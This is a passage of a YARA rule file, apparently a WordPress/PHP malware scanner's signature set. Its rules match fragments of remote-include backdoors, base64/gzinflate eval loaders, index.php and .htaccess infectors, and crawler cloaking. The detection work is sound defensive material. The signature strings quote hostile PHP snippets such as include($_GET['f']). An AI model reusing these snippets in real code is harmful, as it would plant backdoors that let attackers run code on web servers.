        $trigger = "header(\"HTTP/1.0 404 Not Found\");"
    condition:
        $trigger and PR04872 and PR01837
}

rule php_malware_include_030 : malware
{
    strings:
        $trigger = "$this->testStorage('<?php '.$channelID);"
    condition:
        $trigger and PR01362
}

rule php_malware_include_031 : malware
{
    strings:
        $trigger = "include(\"/tmp/\".$_GET[my]);"
    condition:
        $trigger
}

private rule PR04873 : trigger
{
    strings:
        $ps0 = "));exit();}"
    condition:
        $ps0
}

rule php_malware_include_032 : malware
{
    strings:
        $trigger = "include_once"
    condition:
        $trigger and PR04873 and PR00273
}

// MANUAL FIX NECESSARY
rule php_malware_include_033 : malware
{
    strings:
        $trigger = "include_once"
        $php_malware_include_033_r0 = /@include_once\s*\(.(\\[\w]+){1,}(\\x[\w]+){2,}([\w]+){1,}/
    condition:
        $trigger and $php_malware_include_033_r0
}

private rule PR04874 : trigger
{
    strings:
        $ps0 = "Network host configuration. Not recommended edit this code!"
    condition:
        $ps0
}

rule php_malware_include_034 : malware
{
    strings:
        $trigger = "include"
    condition:
        $trigger and PR04874
}

private rule PR04875 : trigger
{
    strings:
        $ps0 = "* Core Post API"
    condition:
        $ps0
}

rule php_malware_include_035 : malware
{
    strings:
        $trigger = "if (file_exists(dirname(__FILE__) . '/wp-"
    condition:
        $trigger and PR04875
}

rule php_malware_include_036 : malware
{
    strings:
        $trigger = "eval(gzinflate(base64_decode('y8xLzilNSY3Pz0tOVVDXz8"
    condition:
        $trigger
}

private rule PR04876 : trigger
{
    strings:
        $ps0 = "//@null \"\\x"
    condition:
        $ps0
}

rule php_malware_include_037 : malware
{
    strings:
        $trigger = "*/"
    condition:
        $trigger and PR04876
}

// MANUAL FIX NECESSARY
rule php_malware_include_038 : malware
{
    strings:
        $trigger = "include"
        $php_malware_include_038_r0 = /if\s*\(is_file\(['\"]((\/\w+){1,8}\/wp-content\/plugins\/[\w+(\/\-\w+)?]+\.(php|html|htm|js|.pl|.sh)['\"]\))\)\s*\{include_once\(['\"][^;]+]\s*;\s*\}/
    condition:
        $trigger and $php_malware_include_038_r0
}

rule php_malware_include_039 : malware
{
    strings:
        $trigger = "/wp-includes/SimplePie/HTTP/tmp/jquery.php'"
    condition:
        $trigger
}

private rule PR04877 : trigger
{
    strings:
        $ps0 = "if (file_exists(ABSPATH.'wp-content"
    condition:
        $ps0
}

rule php_malware_include_040 : malware
{
    strings:
        $trigger = "* WPC Cache"
    condition:
        $trigger and PR04877
}

private rule PR04878 : trigger
{
    strings:
        $ps0 = ".php'); ?>"
    condition:
        $ps0
}

rule php_malware_include_041 : malware
{
    strings:
        $trigger = "<?php error_reporting(-1); include_once("
    condition:
        $trigger and PR04878
}

// MANUAL FIX NECESSARY
rule php_malware_include_043 : malware
{
    strings:
        $trigger = "@include"
        $php_malware_include_043_r0 = /@include[^;\n]+\\[\d]{3}[^;\n]+\\[\d]{3}[^;\n]+\\[\d]{3}[^;\n]+\\[\d]{3}[^;\n]+;/
    condition:
        $trigger and $php_malware_include_043_r0
}

// MANUAL FIX NECESSARY
rule php_malware_include_044 : malware
{
    strings:
        $trigger = "@include"
        $php_malware_include_044_r0 = /<\?php[\s]{40,}@include_once/
    condition:
        $trigger and $php_malware_include_044_r0
}

private rule PR04879 : trigger
{
    strings:
        $ps0 = "isset($_SERVER[\"HTTP_REFERER\"]) ? $_SERVER[\"HTTP_REFERER\"] : $HTTP_REFERER); $str=base64_encode($"
    condition:
        $ps0
}

rule php_malware_include_045 : malware
{
    strings:
        $trigger = ".base64_decode"
    condition:
        $trigger and PR04879
}

// MANUAL FIX NECESSARY
rule php_malware_include_046 : malware
{
    strings:
        $trigger = "define"
        $php_malware_include_046_r0 = /include(_once)?\([^;]+wp-(includes|admin)[^;]+\);/
    condition:
        $trigger and PR02534 and PR01862 and PR01863 and $php_malware_include_046_r0
}

// MANUAL FIX NECESSARY
rule php_malware_include_047 : malware
{
    strings:
        $trigger = "\\x"
        $php_malware_include_047_r0 = /include[\s]*\"(\\x[\w]{2}|\w+)[^;]+\\x[\w]{2}[\w]+\\x[\w]{2}/
    condition:
        $trigger and PR02534 and $php_malware_include_047_r0
}

private rule PR04880 : trigger
{
    strings:
        $ps0 = "// Edit and deleting this code is not recommended!"
    condition:
        $ps0
}

rule php_malware_include_048 : malware
{
    strings:
        $trigger = "@include( ABSPATH . WPINC . '/"
    condition:
        $trigger and PR04880
}

private rule PR04881 : trigger
{
    strings:
        $ps0 = "@include './wp-"
    condition:
        $ps0
}

private rule PR04882 : trigger
{
    strings:
        $ps0 = "* Front to the WordPress"
    condition:
        $ps0
}

rule php_malware_include_049 : malware
{
    strings:
        $trigger = "index.php"
    condition:
        $trigger and PR04881 and PR04882
}

// MANUAL FIX NECESSARY
rule php_malware_include_050 : malware
{
    strings:
        $trigger = "isset($_REQUEST["
        $php_malware_include_050_r0 = /\]\)\){\@?include\(/
    condition:
        $trigger and $php_malware_include_050_r0
}

rule php_malware_include_051 : malware
{
    strings:
        $trigger = "eval(gzinflate(base64_decode('y8xLzil"
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
rule php_malware_include_052 : malware
{
    strings:
        $trigger = "equire"
        $php_malware_include_052_r0 = /[\s]{300,}require(_once)?\(/
    condition:
        $trigger and $php_malware_include_052_r0
}

private rule PR04883 : trigger
{
    strings:
        $ps0 = "echo '<script src="
    condition:
        $ps0
}

rule php_malware_include_053 : malware
{
    strings:
        $trigger = "* Front to the WordPress application."
    condition:
        $trigger and PR04883
}

// MANUAL FIX NECESSARY
rule php_malware_include_054 : malware
{
    strings:
        $trigger = "if (is_file("
        $php_malware_include_054_r0 = /if \(is_file\(['\"][^\)]+['\"]\)\)[ ]*\{?[ ]*include(_once)?\(['\"][^\)]+['\"]\);[\s]*\}?/
    condition:
        $trigger and PR02534 and $php_malware_include_054_r0
}

// MANUAL FIX NECESSARY
rule php_malware_include_055 : malware
{
    strings:
        $trigger = "<?php @include_once("
        $php_malware_include_055_r0 = /<\?php @include_once\([^;]+\/[^;]+\/[^;]+\/[^;]+\/[^;]+\/[^;]+\);[\s]*\?>/
    condition:
        $trigger and $php_malware_include_055_r0
}

private rule PR04884 : trigger
{
    strings:
        $ps0 = "/wp-load.php"
    condition:
        $ps0
}

rule php_malware_include_056 : malware
{
    strings:
        $trigger = "@include"
    condition:
        $trigger and PR04884
}

// MANUAL FIX NECESSARY
rule php_malware_include_056_02 : malware
{
    strings:
        $trigger = "@include"
        $php_malware_include_056_02_r0 = /if[\s]*\(is_file\([^\)]+\)\)[\s]*@inc/
    condition:
        $trigger and PR04884 and $php_malware_include_056_02_r0
}

private rule PR04885 : trigger
{
    strings:
        $ps0 = "if(@file_exists("
    condition:
        $ps0
}

rule php_malware_include_057 : malware
{
    strings:
        $trigger = "catch(Throwable"
    condition:
        $trigger and PR04885
}

rule php_malware_include_058 : malware
{
    strings:
        $trigger = ");  @include_once $"
    condition:
        $trigger and PR01479
}

// MANUAL FIX NECESSARY
private rule PR04886 : trigger
{
    strings:
        $ps0 = "include dirname("
    condition:
        $ps0
}

rule php_malware_include_059 : malware
{
    strings:
        $trigger = "__FILE__"
        $php_malware_include_059_r0 = /<\?php[\s]*@?include[\s]*dirname\(__FILE__\)[\s]*.[\s]*.\/[\w]*\.txt/
    condition:
        $trigger and PR04886 and $php_malware_include_059_r0
}

// MANUAL FIX NECESSARY
rule php_malware_include_061 : malware
{
    strings:
        $trigger = "<?php @include_once \""
        $php_malware_include_061_r0 = /<\?php @include_once \"[^;]+\\x[^;]+\\x[^;]+\\x[^;]+\\x[^;]+\\x[^;]+\";[\s]*\?>/
    condition:
        $trigger and $php_malware_include_061_r0
}

// MANUAL FIX NECESSARY
rule php_malware_include_062 : malware
{
    strings:
        $trigger = "<?php @include_once \""
        $php_malware_include_062_r0 = /<\?php[\s]*@include_once[\s]*.[^;]+;[\s]*if[\s]*\(!defined\([^\}]+true\);[\s]*\}[\s]*\?>/
    condition:
        $trigger and $php_malware_include_062_r0
}

// MANUAL FIX NECESSARY
rule php_malware_include_063 : malware
{
    strings:
        $trigger = "\\x"
        $php_malware_include_063_r0 = /@include_once[\s]*..x[\d]+[\w]+[^;]+;[\s]*if\(!defined\(.[^\)]+\)\)[\s]*\{[\s]*@define\(..x[\d]+[\w]+[^\)]+true\)[\s]*;[\s]*\}/
    condition:
        $trigger and PR03806 and $php_malware_include_063_r0
}

// MANUAL FIX NECESSARY
rule php_malware_include_064 : malware
{
    strings:
        $trigger = "@include"
        $php_malware_include_064_r0 = /@include\s+\"[^\"]*.[\d]{3}[^\s]*.[\d]{3}[^;]*\;/
    condition:
        $trigger and $php_malware_include_064_r0
}

// MANUAL FIX NECESSARY
rule php_malware_include_065 : malware
{
    strings:
        $trigger = "\\x"
        $php_malware_include_065_r0 = /@include_once\(..{1,8}\\x\d+\w+/
    condition:
        $trigger and PR03806 and $php_malware_include_065_r0
}

rule php_malware_include_065_02 : malware
{
    strings:
        $trigger = "{ wp_redirect(get_admin_url()); } else { wp_redirect(get_bloginfo(\"\\x"
    condition:
        $trigger and PR00039
}

// MANUAL FIX NECESSARY
private rule PR04887 : trigger
{
    strings:
        $ps0 = "if(isset($_REQUEST[chr("
    condition:
        $ps0
}

rule php_malware_include_066 : malware
{
    strings:
        $trigger = "&& md5($_GET["
        $php_malware_include_066_r0 = /@include\(\$[\w]+\);[\s]*@unlink\(\$[\w]+\);[\s]*die\(\);[\s]*\}[\s]*else[\s]*\{[\s]*echo[\s]*base64_decode/
    condition:
        $trigger and PR04887 and PR01877 and PR01479 and $php_malware_include_066_r0
}

private rule PR04888 : trigger
{
    strings:
        $ps0 = "<?php if (file_exists(dirname(__FILE__) . '/wp-"
    condition:
        $ps0
}

rule php_malware_include_067 : malware
{
    strings:
        $trigger = "include_once(dirname(__FILE__) . '/wp-"
    condition:
        $trigger and PR04888
}

rule php_malware_include_068 : malware
{
    strings:
        $trigger = "echo file_get_contents('index.html."
    condition:
        $trigger
}

private rule PR04889 : trigger
{
    strings:
        $ps0 = "(strpos(strtolower($_SERVER[\"HTTP_USER_AGENT\"]),\"googlebot\") !=="
    condition:
        $ps0
}

rule php_malware_include_069 : malware
{
    strings:
        $trigger = "REQUE"
    condition:
        $trigger and PR04889 and PR00397
}

private rule PR04890 : trigger
{
    strings:
        $ps0 = "echo ini_get(\xe2\x80\x9csafe_mode\xe2\x80\x9d);"
    condition:
        $ps0
}

rule php_malware_include_070 : malware
{
    strings:
        $trigger = "ini_restore("
    condition:
        $trigger and PR02534 and PR01382 and PR04890
}

private rule PR04891 : trigger
{
    strings:
        $ps0 = "(file_exists(ABSPATH . 'wp-core.php'))"
    condition:
        $ps0
}

rule php_malware_include_071 : malware
{
    strings:
        $trigger = "require_once(ABSPATH . 'wp-core.php');"
    condition:
        $trigger and PR04891
}

// MANUAL FIX NECESSARY
rule php_malware_include_072 : malware
{
    strings:
        $trigger = "include 'phar://"
        $php_malware_include_072_r0 = /include\s'phar:\/\/(\w+.){1,5}\.txt.;/
    condition:
        $trigger and $php_malware_include_072_r0
}

private rule PR04892 : trigger
{
    strings:
        $ps0 = "file_exists(\"wp-admin\")) AND"
    condition:
        $ps0
}

rule php_malware_include_073 : malware
{
    strings:
        $trigger = "file_put_contents('index.php', $"
    condition:
        $trigger and PR04149 and PR04892
}

private rule PR04893 : trigger
{
    strings:
        $ps0 = "include(base64_decode('cGhh"
    condition:
        $ps0
}

rule php_malware_include_074 : malware
{
    strings:
        $trigger = "if(isset($_GET['user'])&&$_GET['user']=="
    condition:
        $trigger and PR04893
}

private rule PR04894 : trigger
{
    strings:
        $ps0 = "cGhhcjovL2"
    condition:
        $ps0
}

rule php_malware_include_075 : malware
{
    strings:
        $trigger = "(base64_decode("
    condition:
        $trigger and PR04894
}

rule php_malware_include_076 : malware
{
    strings:
        $trigger = "include(\"phar://"
    condition:
        $trigger
}

private rule PR04895 : trigger
{
    strings:
        $ps0 = "include __DIR__"
    condition:
        $ps0
}

rule php_malware_include_077 : malware
{
    strings:
        $trigger = "define"
    condition:
        $trigger and PR04895 and PR01862 and PR01863
}

rule php_malware_include_078 : malware
{
    strings:
        $trigger = "include $_GET['func'];"
    condition:
        $trigger
}

private rule PR04896 : trigger
{
    strings:
        $ps0 = "foreach (glob(ABSPATH .'"
    condition:
        $ps0
}

rule php_malware_include_079 : malware
{
    strings:
        $trigger = "wp-config.php"
    condition:
        $trigger and PR03207 and PR04896
}

private rule PR04897 : trigger
{
    strings:
        $ps0 = ",\"<?php \".$_POST["
    condition:
        $ps0
}

private rule PR04898 : trigger
{
    strings:
        $ps0 = "[\"uri\"];}"
    condition:
        $ps0
}

rule php_malware_include_081 : malware
{
    strings:
        $trigger = "=tmpfile();fwrite($"
    condition:
        $trigger and PR04897 and PR04898
}

private rule PR04899 : trigger
{
    strings:
        $ps0 = "create_function('&$postdata,"
    condition:
        $ps0
}

private rule PR04900 : trigger
{
    strings:
        $ps0 = "(isset($_SERVER[strtoupper("
    condition:
        $ps0
}

rule php_malware_include_082 : malware
{
    strings:
        $trigger = "file"
    condition:
        $trigger and PR04899 and PR04900
}

private rule PR04901 : trigger
{
    strings:
        $ps0 = "if(!defined('WAF')) include(WWWROOT_DIRECTORY.WORDPRESS_FOLDER_PATH."
    condition:
        $ps0
}

private rule PR04902 : trigger
{
    strings:
        $ps0 = "file_put_contents(WWWROOT_DIRECTORY.WORDPRESS_FOLDER_PATH"
    condition:
        $ps0
}

rule php_malware_include_083 : malware
{
    strings:
        $trigger = "if(md5(getenv('HTTP_USER_AGENT'))"
    condition:
        $trigger and PR04901 and PR04902
}

rule php_malware_include_084 : malware
{
    strings:
        $trigger = "include \"phar"
    condition:
        $trigger
}

rule php_malware_include_085 : malware
{
    strings:
        $trigger = "include \"\\160har"
    condition:
        $trigger
}

rule php_malware_include_086 : malware
{
    strings:
        $trigger = "include \"p\\150ar"
    condition:
        $trigger
}

rule php_malware_include_087 : malware
{
    strings:
        $trigger = "include \"ph\\141r"
    condition:
        $trigger
}

rule php_malware_include_088 : malware
{
    strings:
        $trigger = "include \"pha\\162"
    condition:
        $trigger
}

rule php_malware_include_089 : malware
{
    strings:
        $trigger = "include \"\\160\\150ar"
    condition:
        $trigger
}

rule php_malware_include_090 : malware
{
    strings:
        $trigger = "include \"p\\150\\141r"
    condition:
        $trigger
}

rule php_malware_include_091 : malware
{
    strings:
        $trigger = "include \"ph\\141\\162"
    condition:
        $trigger
}

rule php_malware_include_092 : malware
{
    strings:
        $trigger = "include \"\\160\\150\\141r"
    condition:
        $trigger
}

rule php_malware_include_093 : malware
{
    strings:
        $trigger = "include \"\\160\\150\\141\\162"
    condition:
        $trigger
}

private rule PR04903 : trigger
{
    strings:
        $ps0 = "if(!isset($_POST[\"log_flg\"])){$log_flg=\"&log\";}"
    condition:
        $ps0
}

rule php_malware_include_094 : malware
{
    strings:
        $trigger = "{print \"sys_active\""
    condition:
        $trigger and PR04903
}

private rule PR04904 : trigger
{
    strings:
        $ps0 = "fwrite($fopen, get($data[0]));"
    condition:
        $ps0
}

rule php_malware_include_095 : malware
{
    strings:
        $trigger = "md5($_SERVER['HTTP_HOST']).'.php'];"
    condition:
        $trigger and PR04904 and PR01458
}

rule php_malware_include_096 : malware
{
    strings:
        $trigger = "@include \"\\x2f\\x68\\x6f\\x6d\\x65\\x2f"
    condition:
        $trigger
}

private rule PR04905 : trigger
{
    strings:
        $ps0 = "if (isset($_GET['f'])) {"
    condition:
        $ps0
}

rule php_malware_include_097 : malware
{
    strings:
        $trigger = "include($_GET['f']);die;"
    condition:
        $trigger and PR04905
}

// MANUAL FIX NECESSARY
private rule PR04906 : trigger
{
    strings:
        $ps0 = "wp-blog-header"
    condition:
        $ps0
}

private rule PR04907 : trigger
{
    strings:
        $ps0 = "\\57"
    condition:
        $ps0
}

rule php_malware_include_098 : malware
{
    strings:
        $trigger = "require __DIR__"
        $php_malware_include_098_r0 = /include\(.[^\)]+.57[^\)]+\);/
    condition:
        $trigger and PR04906 and PR02534 and PR04907 and $php_malware_include_098_r0
}

rule php_malware_include_099 : malware
{
    strings:
        $trigger = "<?php @include \""
    condition:
        $trigger and PR00634
}

// MANUAL FIX NECESSARY
rule php_malware_include_109 : malware
{
    strings:
        $trigger = "@include"
        $php_malware_include_109_r0 = /\s{20}<\?php\s\@include\(.[^;]*\/[^;]+\.php.\);\s\?>/
    condition:
        $trigger and $php_malware_include_109_r0
}

private rule PR04908 : trigger
{
    strings:
        $ps0 = "range(chr("
    condition:
        $ps0
}

rule php_malware_include_121 : malware
{
    strings:
        $trigger = ")); @include $"
    condition:
        $trigger and PR04908 and PR01932 and PR01016
}

// MANUAL FIX NECESSARY
rule php_malware_include_tmp_001 : malware
{
    strings:
        $trigger = "include"
        $php_malware_include_tmp_001_r0 = /include\(.\/tmp\/\w+.\)\s*;/
    condition:
        $trigger and $php_malware_include_tmp_001_r0
}

// MANUAL FIX NECESSARY
rule php_malware_include_tmp_002 : malware
{
    strings:
        $trigger = "if(isset($_GET"
        $php_malware_include_tmp_002_r0 = /if[\s]*\([\s]*isset\(\$_GET\[.[\w]+.\]\)[\s]*&&[\s]*\$_GET\[.[\w]+.\]==.[\w]+.\)[\s]*\{[\s]*include\([^;]+\);[\s]*\}/
    condition:
        $trigger and $php_malware_include_tmp_002_r0
}

rule php_malware_infector_001 : malware
{
    strings:
        $trigger = "));@touch(\"index.php\",strtotime(\"-"
    condition:
        $trigger and PR00435
}

private rule PR04909 : trigger
{
    strings:
        $ps0 = "@search_file($_SERVER['DOCUMENT_ROOT'].\"/../../../../..\",$file_to_search);"
    condition:
        $ps0
}

rule php_malware_infector_002 : malware
{
    strings:
        $trigger = "echo \"e1:\".$f"
    condition:
        $trigger and PR00435 and PR04909
}

private rule PR04910 : trigger
{
    strings:
        $ps0 = "(){if(document.cookie.indexOf(\"wp-settings\")>"
    condition:
        $ps0
}

rule php_malware_infector_003 : malware
{
    strings:
        $trigger = "String.fromCharCode(104,116,116"
    condition:
        $trigger and PR04910
}

private rule PR04911 : trigger
{
    strings:
        $ps0 = "search_file_js($_SERVER['DOCUMENT_ROOT'].\"/../../../.."
    condition:
        $ps0
}

rule php_malware_infector_004 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01468 and PR01469 and PR04911
}

private rule PR04912 : trigger
{
    strings:
        $ps0 = "@file_put_contents("
    condition:
        $ps0
}

private rule PR04913 : trigger
{
    strings:
        $ps0 = "@include("
    condition:
        $ps0
}

private rule PR04914 : trigger
{
    strings:
        $ps0 = "@unlink("
    condition:
        $ps0
}

rule php_malware_infector_005 : malware
{
    strings:
        $trigger = ",chr(60).chr(63).chr(112).chr(104).chr(112).chr(32)"
    condition:
        $trigger and PR04912 and PR04913 and PR04914
}

private rule PR04915 : trigger
{
    strings:
        $ps0 = "gzinflate(substr("
    condition:
        $ps0
}

private rule PR04916 : trigger
{
    strings:
        $ps0 = "error_reporting(E_ALL^E_NOTICE);define("
    condition:
        $ps0
}

rule php_malware_infector_006 : malware
{
    strings:
        $trigger = "explode('|"
    condition:
        $trigger and PR04915 and PR04916
}

private rule PR04917 : trigger
{
    strings:
        $ps0 = "'widgets';"
    condition:
        $ps0
}

private rule PR04918 : trigger
{
    strings:
        $ps0 = "'wp-admin';"
    condition:
        $ps0
}

private rule PR04919 : trigger
{
    strings:
        $ps0 = "<FilesMatch \"\\.(php|php.|phtm|phtm.|shtm|shtm.)$\">"
    condition:
        $ps0
}

rule php_malware_infector_008 : malware
{
    strings:
        $trigger = "!is_dir("
    condition:
        $trigger and PR00435 and PR04917 and PR04918 and PR04919
}

private rule PR04920 : trigger
{
    strings:
        $ps0 = "if(!preg_match('/parse_str/i',"
    condition:
        $ps0
}

private rule PR04921 : trigger
{
    strings:
        $ps0 = "touch('/"
    condition:
        $ps0
}

private rule PR04922 : trigger
{
    strings:
        $ps0 = "$str);"
    condition:
        $ps0
}

private rule PR04923 : trigger
{
    strings:
        $ps0 = "0640);"
    condition:
        $ps0
}

private rule PR04924 : trigger
{
    strings:
        $ps0 = "str_replace($old,"
    condition:
        $ps0
}

rule php_malware_infector_009 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR04920 and PR04921 and PR04922 and PR04923 and PR04924
}

rule php_malware_infector_010 : malware
{
    strings:
        $trigger = "= '<?php' . PHP_EOL . '$str = file_get_contents("
    condition:
        $trigger and PR01468 and PR01469
}

private rule PR04925 : trigger
{
    strings:
        $ps0 = "false){ $display_content .=  $index_path . PHP_EOL;"
    condition:
        $ps0
}

rule php_malware_infector_011 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01468 and PR01469 and PR04925
}

private rule PR04926 : trigger
{
    strings:
        $ps0 = "@file_get_contents(\"http://\".$this->_tdsdomain.\":\".$this->_port.$selector, false, $context);"
    condition:
        $ps0
}

rule php_malware_infector_012 : malware
{
    strings:
        $trigger = "explode("
    condition:
        $trigger and PR04926
}

private rule PR04927 : trigger
{
    strings:
        $ps0 = "@file_put_contents($dir.'/.htaccess',$htxt.'"
    condition:
        $ps0
}

rule php_malware_infector_013 : malware
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR04927 and PR01431
}

private rule PR04928 : trigger
{
    strings:
        $ps0 = "@touch($do"
    condition:
        $ps0
}

private rule PR04929 : trigger
{
    strings:
        $ps0 = "@fwrite($f,$index_new_con);"
    condition:
        $ps0
}

rule php_malware_infector_014 : malware
{
    strings:
        $trigger = "file"
    condition:
        $trigger and PR04928 and PR04929
}

private rule PR04930 : trigger
{
    strings:
        $ps0 = "str_rot13(base64_encode($jpg_index_con));"
    condition:
        $ps0
}

rule php_malware_infector_014_02 : malware
{
    strings:
        $trigger = "file"
    condition:
        $trigger and PR04928 and PR04930
}

private rule PR04931 : trigger
{
    strings:
        $ps0 = "if (file_put_contents ($indexyol, $hecindex));"
    condition:
        $ps0
}

rule php_malware_infector_015 : malware
{
    strings:
        $trigger = "return $"
    condition:
        $trigger and PR01021 and PR04931 and PR01569 and PR01431
}

private rule PR04932 : trigger
{
    strings:
        $ps0 = "@file_put_contents($index,file_get_contents($bkindex));"
    condition:
        $ps0
}

rule php_malware_infector_016 : malware
{
    strings:
        $trigger = "!file_exists($"
    condition:
        $trigger and PR04932
}

rule php_malware_infector_017 : malware
{
    strings:
        $trigger = "$res.= $out;}@pclose($f);if(strstr($res,\"\\x70\\x68\\x70\\x20\\x69\\x6e\\x64\\x65\\x78\\x2e\\x70\\x68\\x70\""
    condition:
        $trigger
}

private rule PR04933 : trigger
{
    strings:
        $ps0 = "@touch($root.$auto, strtotime(\"-100 days\", time()));"
    condition:
        $ps0
}

rule php_malware_infector_017_02 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01468 and PR04933
}

rule php_malware_infector_018 : malware
{
    strings:
        $trigger = "$index_hide = base64_decode(str_rot13"
    condition:
        $trigger and PR00029
}

rule php_malware_infector_018_02 : malware
{
    strings:
        $trigger = "D1R5nz5IGxSDqxIQF21BnycFBKAUZGyQD0gWoT9HE"
    condition:
        $trigger and PR01642
}

private rule PR04934 : trigger
{
    strings:
        $ps0 = "base64_decode('bWtkaXI=');"
    condition:
        $ps0
}

private rule PR04935 : trigger
{
    strings:
        $ps0 = "0755, true);"
    condition:
        $ps0
}

private rule PR04936 : trigger
{
    strings:
        $ps0 = "file"
    condition:
        $ps0
}

rule php_malware_infector_019 : malware
{
    strings:
        $trigger = "strtotime(\"-111 days\", time()));"
    condition:
        $trigger and PR03250 and PR04934 and PR04935 and PR04936
}

private rule PR04937 : trigger
{
    strings:
        $ps0 = "function makeInit()"
    condition:
        $ps0
}

rule php_malware_infector_020 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR02092 and PR01428 and PR04937 and PR01021 and PR03250
}

private rule PR04938 : trigger
{
    strings:
        $ps0 = "copy($temp[$i].'/functions.php',$temp[$i]."
    condition:
        $ps0
}

rule php_malware_infector_021 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR04938 and PR00355 and PR01392 and PR00357
}

private rule PR04939 : trigger
{
    strings:
        $ps0 = "@shell_exec('chmod 666 '.$path);"
    condition:
        $ps0
}

private rule PR04940 : trigger
{
    strings:
        $ps0 = "(dirname(dirname(dirname(dirname(__FILE__))))))));"
    condition:
        $ps0
}

rule php_malware_infector_022 : malware
{
    strings:
        $trigger = "wp"
    condition:
        $trigger and PR04939 and PR04940 and PR02208
}

rule php_malware_infector_022_02 : malware
{
    strings:
        $trigger = "@include('/tmp'.'/wp-template.txt');"
    condition:
        $trigger
}

private rule PR04941 : trigger
{
    strings:
        $ps0 = ")){$ip=@file_get_contents($"
    condition:
        $ps0
}

private rule PR04942 : trigger
{
    strings:
        $ps0 = "file_put_contents($d,'ip:');"
    condition:
        $ps0
}

rule php_malware_infector_022_03 : malware
{
    strings:
        $trigger = "wp"
    condition:
        $trigger and PR04941 and PR04942
}

private rule PR04943 : trigger
{
    strings:
        $ps0 = "$out = base64_decode(\"UmV3cml0ZUVuZ2luZSBPbiAKUmV3cml0ZVJ1bGUgXihbQS"
    condition:
        $ps0
}

rule php_malware_infector_022_04 : malware
{
    strings:
        $trigger = "$name = base64_decode(\"Lmh0YWNjZXNz\");"
    condition:
        $trigger and PR00435 and PR04943
}

rule php_malware_infector_022_05 : malware
{
    strings:
        $trigger = "),implode(\" \",array_keys($_COOKIE)))){"
    condition:
        $trigger
}

private rule PR04944 : trigger
{
    strings:
        $ps0 = "my_mkdir($dir);"
    condition:
        $ps0
}

private rule PR04945 : trigger
{
    strings:
        $ps0 = "$filestr2 = preg_replace('#<\\?php#i', '<?php'. PHP_EOL"
    condition:
        $ps0
}

rule php_malware_infector_023 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00113 and PR01428 and PR04944 and PR01021 and PR04945
}

rule php_malware_infector_024 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00113 and PR01428 and PR04944 and PR01021 and PR02816
}

private rule PR04946 : trigger
{
    strings:
        $ps0 = "$one_pass = !empty($one_pass)?$one_pass:"
    condition:
        $ps0
}

rule php_malware_infector_025 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01428 and PR01021 and PR04946
}

private rule PR04947 : trigger
{
    strings:
        $ps0 = "$check123 = $_SERVER['DOCUMENT_ROOT'] ."
    condition:
        $ps0
}

rule php_malware_infector_026 : malware
{
    strings:
        $trigger = "@$gitt = file_get_"
    condition:
        $trigger and PR04947 and PR01431 and PR01021
}

private rule PR04948 : trigger
{
    strings:
        $ps0 = "$theContentMd5 = md5($thecontent);"
    condition:
        $ps0
}

private rule PR04949 : trigger
{
    strings:
        $ps0 = "$content = '<FilesMatch \".*\">"
    condition:
        $ps0
}

rule php_malware_infector_027 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR04948 and PR04949 and PR01021 and PR02141
}

rule php_malware_infector_028 : malware
{
    strings:
        $trigger = "$LOGGER = Logger($page,\"$IP\",\"$hostname\",\"$day\",\"$querry\",\"$agent\");"
    condition:
        $trigger and PR00029 and PR01422 and PR01748
}

private rule PR04950 : trigger
{
    strings:
        $ps0 = ".txt\";$t=\"\";if(preg_match_all("
    condition:
        $ps0
}

rule php_malware_injector_003_02 : malware
{
    strings:
        $trigger = "file_get_c"
    condition:
        $trigger and PR04950
}

private rule PR04951 : trigger
{
    strings:
        $ps0 = "$code_inject = '<?php eval"
    condition:
        $ps0
}

rule php_malware_injector_013 : malware
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR04951
}

private rule PR04952 : trigger
{
    strings:
        $ps0 = "die(\"[!] Seems like ive bee there before"
    condition:
        $ps0
}

rule php_malware_injector_014 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00355 and PR04952 and PR00357
}

rule php_malware_injector_020 : malware
{
    strings:
        $trigger = "$dir = getDir(getcwd().\"/db/\");"
    condition:
        $trigger and PR00507
}

rule php_malware_injector_021 : malware
{
    strings:
        $trigger = "/*EngineWork*/if(!defined("
    condition:
        $trigger
}

rule php_malware_injector_023 : malware
{
    strings:
        $trigger = "ob_start_flush"
    condition:
        $trigger
}

rule php_malware_injector_024 : malware
{
    strings:
        $trigger = "break;}}}}if($c_==1){unset($_GET[$c1]);$c4=false;$c5='';$c6='';include '"
    condition:
        $trigger and PR00091
}

rule php_malware_injector_025 : malware
{
    strings:
        $trigger = "=false;mkdir('cms');touch('cms',mktime"
    condition:
        $trigger and PR00091
}

rule php_malware_injector_026 : malware
{
    strings:
        $trigger = "if(count($_GET)>0){$c_=0;$c0=explode('&',$_SERVER['QUERY_STRING']);if(preg_match"
    condition:
        $trigger
}

private rule PR04953 : trigger
{
    strings:
        $ps0 = ",9,1))],'-_,','+/=')));$"
    condition:
        $ps0
}

rule php_malware_injector_027 : malware
{
    strings:
        $trigger = "REQUE"
    condition:
        $trigger and PR04953
}

private rule PR04954 : trigger
{
    strings:
        $ps0 = "<?php readfile("
    condition:
        $ps0
}

rule php_malware_injector_028 : malware
{
    strings:
        $trigger = "top:"
    condition:
        $trigger and PR00287 and PR04954
}

private rule PR04955 : trigger
{
    strings:
        $ps0 = "$refer=getenv('HTTP_USER_AGENT');"
    condition:
        $ps0
}

rule php_malware_injector_029 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR04955
}

private rule PR04956 : trigger
{
    strings:
        $ps0 = "d3AtYWRtaW4="
    condition:
        $ps0
}

rule php_malware_injector_031 : malware
{
    strings:
        $trigger = "strpos($_SERVER[base64_decode"
    condition:
        $trigger and PR04956
}

rule php_malware_injector_032 : malware
{
    strings:
